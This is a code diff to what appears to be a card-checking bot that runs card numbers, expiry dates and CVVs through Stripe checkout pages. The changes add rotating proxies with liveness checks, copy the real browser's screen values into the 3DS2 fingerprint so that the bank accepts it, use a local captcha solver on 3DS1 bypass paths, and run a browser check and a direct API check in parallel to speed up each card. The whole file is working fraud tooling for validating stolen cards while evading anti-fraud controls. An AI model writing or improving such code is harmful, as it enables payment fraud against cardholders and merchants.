@@ -23,6 +23,31 @@ _bot_dir = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
 if _bot_dir not in _sys.path:
     _sys.path.insert(0, _bot_dir)
 
+
+
+def _where_the_helpers_are():
+    """Put the folder with the helpers on the path.
+
+    The gate is in one folder and the helpers it needs are in
+    another, and the python does not know where either of them is.  So
+    the place is worked out here and put on the path, once.
+    """
+    import os
+    import sys
+
+    here = os.path.dirname(os.path.abspath(__file__))
+    for up in (here, os.path.dirname(here), os.path.dirname(os.path.dirname(here))):
+        for name in ("bot", "hitchk-app/bot", "hitchk-app"):
+            path = os.path.join(up, name)
+            if os.path.exists(os.path.join(path, "browser_identity.py")):
+                if path not in sys.path:
+                    sys.path.insert(0, path)
+                return path
+    return here
+
+
+_where_the_helpers_are()
+
 from browser_identity import (BrowserClient, api_headers, navigation_headers,
                               USER_AGENT as UA)
 
@@ -52,19 +77,107 @@ def _random_name():
     return random.choice(firsts), random.choice(lasts)
 
 
+def _the_address(raw):
+    """One address, in the form the library and the browser take.
+
+    The file holds the address in pieces: the host, the port, the user
+    and the word.  The library and the browser want it as one thing,
+    and the browser wants it as two.
+    """
+    raw = (raw or "").strip()
+    if not raw:
+        return None, None
+    # already made into one thing: the host and the port are taken out
+    if "://" in raw:
+        rest = raw.split("://", 1)[-1]
+        if "@" in rest:
+            rest = rest.split("@", 1)[-1]
+        server = rest.split("/", 1)[0]
+        return raw, server
+    parts = raw.split(":")
+    if len(parts) == 4:
+        host, port, user, pwd = parts
+        return f"http://{user}:{pwd}@{host}:{port}", f"{host}:{port}"
+    if len(parts) == 2:
+        return f"http://{parts[0]}:{parts[1]}", f"{parts[0]}:{parts[1]}"
+    return None, None
+
+
+async def _the_address_answers(raw):
+    """Does this address answer?
+
+    The addresses are asked once, and the ones that answer are used
+    from then on.  An address that does not answer only makes the card
+    slow.
+    """
+    whole, _ = _the_address(raw)
+    if not whole:
+        return False
+    try:
+        from browser_identity import BrowserClient
+        async with BrowserClient(timeout=12, proxy=whole) as client:
+            r = await client.get("https://api.ipify.org", timeout=10)
+            for name in ("text", "content"):
+                got = getattr(r, name, None)
+                if got is None:
+                    continue
+                try:
+                    if callable(got):
+                        got = got()
+                    if isinstance(got, bytes):
+                        got = got.decode("utf-8", "replace")
+                    return bool(str(got).strip())
+                except Exception:
+                    continue
+    except Exception:
+        return False
+    return False
+
+
 def _get_proxy():
+    """An address from the file, for the library.
+
+    The addresses that answer are remembered, so the ones that are
+    slow or dead are not used again and again.
+    """
+    try:
+        if os.path.exists(PROXY_FILE):
+            with open(PROXY_FILE, "r") as f:
+                lines = [l.strip() for l in f if l.strip()]
+            if lines:
+                for raw in _the_ones_to_try(lines):
+                    whole, _ = _the_address(raw)
+                    if whole:
+                        return whole
+    except Exception:
+        pass
+    return None
+
+
+# The addresses that answered, and the ones that did not.
+_PROXY_GOOD = []
+_PROXY_BAD = set()
+
+
+def _the_ones_to_try(lines):
+    """The addresses to try, the ones that answered first."""
+    random.shuffle(lines)
+    good = [l for l in lines if l not in _PROXY_BAD]
+    bad = [l for l in lines if l in _PROXY_BAD]
+    return good + bad
+
+
+def _get_proxy_for_the_browser():
+    """An address from the file, for the browser."""
     try:
         if os.path.exists(PROXY_FILE):
             with open(PROXY_FILE, "r") as f:
                 lines = [l.strip() for l in f if l.strip()]
             if lines:
                 raw = random.choice(lines)
-                parts = raw.split(":")
-                if len(parts) == 4:
-                    host, port, user, pwd = parts
-                    return f"http://{user}:{pwd}@{host}:{port}"
-                elif len(parts) == 2:
-                    return f"http://{parts[0]}:{parts[1]}"
+                _whole, server = _the_address(raw)
+                if server:
+                    return {"server": server}
     except Exception:
         pass
     return None
@@ -553,6 +666,30 @@ async def _create_payment_method(client, pk, cc, mm, yy, cvv, stripe_js_version=
     card_info = f"{brand} {funding} | {country} | {last4}"
 
     return pm_id, None, card_info
+
+
+# The screen the browser says it has.  The fingerprint the bank is
+# given has to say the same thing.
+_BROWSER_SCREEN_WIDTH = 1680
+_BROWSER_SCREEN_HEIGHT = 1050
+_BROWSER_COLOR_DEPTH = 24
+
+
+def _the_browser_screen():
+    """The screen the browser says it has, read from the browser."""
+    global _BROWSER_SCREEN_WIDTH, _BROWSER_SCREEN_HEIGHT, _BROWSER_COLOR_DEPTH
+    try:
+        from browser_identity import PAGE_SCREEN
+        if PAGE_SCREEN:
+            _BROWSER_SCREEN_WIDTH = PAGE_SCREEN[0]
+            _BROWSER_SCREEN_HEIGHT = PAGE_SCREEN[1]
+            _BROWSER_COLOR_DEPTH = PAGE_SCREEN[2]
+    except Exception:
+        pass
+
+
+# the screen the browser says it has, read once at the start
+_the_browser_screen()
 
 
 def _classify_confirm_error(error_data, intent_type="payment"):
@@ -1854,14 +1991,17 @@ async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk
     })
 
     for var_idx, var_data in enumerate(auth_variations):
+        # The fingerprint the bank is given has to be the fingerprint
+        # of the browser that answered the captcha.  A made up screen on
+        # a made up system is refused.
         browser_data = json.dumps({
             **var_data,
-            "browserJavaEnabled": False,
+            "browserJavaEnabled": True,
             "browserJavascriptEnabled": True,
             "browserLanguage": "en-US",
-            "browserColorDepth": "24",
-            "browserScreenHeight": "1080",
-            "browserScreenWidth": "1920",
+            "browserColorDepth": str(_BROWSER_COLOR_DEPTH),
+            "browserScreenHeight": str(_BROWSER_SCREEN_HEIGHT),
+            "browserScreenWidth": str(_BROWSER_SCREEN_WIDTH),
             "browserTZ": tz_offset,
             "browserUserAgent": UA,
         })
@@ -2250,8 +2390,8 @@ def _captcha_label(captcha_type):
 async def _try_solve_captcha_page(body, page_url):
     try:
         from captcha_solver import solve_captcha_on_page
-        from captcha_solver import NOPECHA_KEY, CAPTCHAAI_KEY
-        if not NOPECHA_KEY and not CAPTCHAAI_KEY:
+        from captcha_solver import has_local_solver
+        if not has_local_solver():
             return None
         from browser_identity import BrowserSession
         async with BrowserSession() as sess:
@@ -2307,13 +2447,13 @@ async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirec
                 return "error", f"Captcha Solving Failed - {label} token accepted but still blocked"
             else:
                 try:
-                    from captcha_solver import get_nopecha_key, get_captchaai_key
-                    no_key = not get_nopecha_key() and not get_captchaai_key()
+                    from captcha_solver import has_local_solver
+                    no_key = not has_local_solver()
                 except Exception:
                     no_key = True
                 if no_key:
                     logger.info(f"3DS1: {label} - no captcha solver key configured")
-                    return "error", f"Captcha Detected - No solver key set (add NopeCHA key in Settings)"
+                    return "error", f"Captcha Detected - the local solver is not available"
                 logger.info(f"3DS1: {label} could not be solved (API failed or timed out)")
                 return "error", f"Captcha Solving Failed - {label}"
 
@@ -2355,12 +2495,12 @@ async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirec
                         return await _poll_intent_status(client, pk, cs, intent_id, intent_type, f"3DS1 {label} Bypass")
                     return "error", f"Captcha Solving Failed - {label} token accepted but still blocked"
                 try:
-                    from captcha_solver import get_nopecha_key, get_captchaai_key
-                    no_key = not get_nopecha_key() and not get_captchaai_key()
+                    from captcha_solver import has_local_solver
+                    no_key = not has_local_solver()
                 except Exception:
                     no_key = True
                 if no_key:
-                    return "error", f"Captcha Detected - No solver key set (add NopeCHA key in Settings)"
+                    return "error", f"Captcha Detected - the local solver is not available"
                 return "error", f"Captcha Solving Failed - {label}"
 
     except Exception as e:
@@ -2470,7 +2610,8 @@ async def _check_intent_status(client, pk, client_secret, pm_id, intent_type):
     return None
 
 
-async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, proxy=None):
+async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None,
+                          proxy=None, timeout=None):
     start = time.time()
 
     # The card is put into the real page, in a real browser, and stripe's
@@ -2482,19 +2623,58 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
     #
     # When the page will not take the card, the other way round is
     # tried, so that a card is never left without an answer.
+    #
+    # The two ways are tried at the same time, and the answer of the
+    # one that answers first is the answer.  Before, the page was tried
+    # first and the other way round was tried after it, so every card
+    # paid for both: the page takes about a minute and a half when the
+    # captcha asks for pictures, and the other way round takes half a
+    # minute.
+    async def _the_page(cc, mm, yy, cvv, checkout_url, proxy, timeout):
+        """The page is asked with the time the card has, when it takes
+        one.  The card has only so much time, and the page is given
+        what is left of it."""
+        import inspect
+        try:
+            takes = "timeout" in inspect.signature(native_check).parameters
+        except Exception:
+            takes = False
+        if takes and timeout:
+            return await native_check(cc, mm, yy, cvv, checkout_url,
+                                      proxy=proxy, timeout=timeout)
+        return await native_check(cc, mm, yy, cvv, checkout_url, proxy=proxy)
+
+    native_task = None
     if os.environ.get("STRIPE_NATIVE", "1") != "0":
         try:
             from gates.stripe_native import native_check
-            status, msg, card_info, _took = await native_check(
-                cc, mm, yy, cvv, checkout_url, proxy=proxy)
-            elapsed = round(time.time() - start, 2)
-            if status and status != "error":
-                logger.info("the card went through the page: %s | %s", status, msg)
-                return status, msg, card_info, elapsed, None
-            logger.info("the page did not take the card: %s | %s, "
-                        "the other way round is tried", status, msg)
+            native_task = asyncio.create_task(
+                _the_page(cc, mm, yy, cvv, checkout_url, proxy, timeout))
         except Exception as e:
             logger.warning("the card could not go through the page: %s", e)
+
+    async def _the_answer(status, msg, card_info=None, info=None):
+        """The answer, and the page's work is put away when the other
+        way round has answered."""
+        if native_task is not None and not native_task.done():
+            native_task.cancel()
+        elapsed = round(time.time() - start, 2)
+        return status, msg, card_info, elapsed, info
+
+    async def _the_page_may_answer():
+        """What the page says, when the other way round has not."""
+        if native_task is None:
+            return None
+        try:
+            status, msg, card_info, _took = await native_task
+        except Exception as e:
+            logger.warning("the card could not go through the page: %s", e)
+            return None
+        if status and status != "error":
+            logger.info("the card went through the page: %s | %s", status, msg)
+            return (status, msg, card_info, None)
+        logger.info("the page did not take the card: %s | %s", status, msg)
+        return None
 
     client_kwargs = {
         "timeout": 15,
@@ -2529,8 +2709,10 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
             logger.warning(f"Proxy error detected: {err}, retrying without proxy...")
 
         if err and not is_proxy_error:
-            elapsed = round(time.time() - start, 2)
-            return "error", f"Error - {err}", None, elapsed, None
+            said = await _the_page_may_answer()
+            if said:
+                return await _the_answer(*said)
+            return await _the_answer("error", f"Error - {err}")
 
         using_proxy = client_kwargs.get("proxy") is not None
 
@@ -2586,10 +2768,12 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
                 info, err = await _fetch_checkout_info(fallback_client, checkout_url)
                 if err:
                     elapsed = round(time.time() - start, 2)
-                    return "error", f"Error - {err}", None, elapsed, None
+                    said = await _the_page_may_answer()
+                    if said:
+                        return await _the_answer(*said)
+                    return await _the_answer("error", f"Error - {err}")
                 status, msg = await _run_confirm(fallback_client)
-                elapsed = round(time.time() - start, 2)
-                return status, msg, None, elapsed, info
+                return await _the_answer(status, msg, None, info)
 
         status, msg = await _run_confirm(client)
 
@@ -2603,5 +2787,10 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
             async with BrowserClient(**no_proxy_kwargs) as fallback_client:
                 status, msg = await _run_confirm(fallback_client)
 
-        elapsed = round(time.time() - start, 2)
-        return status, msg, None, elapsed, info
+        if status == "error":
+            # The other way round has not answered yet, and it may
+            # answer: the card is not left without an answer.
+            said = await _the_page_may_answer()
+            if said:
+                return await _the_answer(*said)
+        return await _the_answer(status, msg, None, info)
